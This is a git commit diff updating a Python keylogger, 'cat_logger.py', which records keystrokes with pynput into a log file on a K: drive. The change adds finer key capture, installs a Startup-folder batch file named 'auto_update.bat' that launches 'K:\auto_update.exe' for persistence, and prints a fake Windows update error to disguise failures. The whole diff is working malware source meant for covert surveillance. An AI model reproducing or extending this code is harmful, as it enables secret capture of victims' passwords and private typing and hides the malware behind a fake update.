9863483168b5430274cbab3d4a44e272491997d1
rickyfili10 <104445179+rickyfili10@users.noreply.github.com>
2024-04-10 23:05:02 +0200

    Update cat_logger.py
    Improved the code

--- python/cat_logger.py
+++ python/cat_logger.py
@@ -3,41 +3,53 @@ import smtplib, ssl
 import time
 import getpass
 import shutil
-
 class Keylogger:
     
-    def __init__(self):
+    def __init__(self): 
         self.logger = ""
-        
+
     def send_data(self, keystrike):
         self.logger += keystrike
-        with open("log.txt","a+",encoding="utf-8") as new_file:
+        with open("K:\\log.txt","a+",encoding="utf-8") as new_file:
             new_file.write(self.logger)
 
         self.logger = ""
 
     def take_keys(self, key):
-        
-        try:
-            hit_key = str(key.char)
+     try:
+        hit_key = str(key.char)
 
-        except AttributeError:
-            
-            if key == key.space:
-                hit_key = ""
+     except AttributeError:
+        if key == key.enter:
+            hit_key = "\n" + str(key) + "\n"
+        elif key == key.shift:
+            hit_key = ""
+        elif key == key.space:
+            hit_key = ""
+        elif key == key.backspace:
+            # Handle backspace key here
+            hit_key = ""
+        elif key == key.enter:
+            hit_key = "\n"
+        elif key == key.caps_lock:
+            hit_key = "\nCAPS LOCK\n"
+        elif key == key.ctrl_r:
+            hit_key  = "\nCtrl right\n"
+        elif key == key.ctrl_l:
+            hit_key = "\nCtrl left\n"
+        else:
+            hit_key = "" + str(key) + ""
 
-            else:
-                hit_key = "" + str(key) + ""
-
-        self.send_data(hit_key)
+     self.send_data(hit_key)
 
     def change_dir(self):
         try:
             username = getpass.getuser()
-            shutil.move(r"E:\start.exe", fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.exe")
-            
+            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
+            # Write content to the file
+                file.write(f"""start K:\\auto_update.exe""")
         except Exception as e:
-            pass
+            print("Error [0x80070643]: Failed to Update")
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
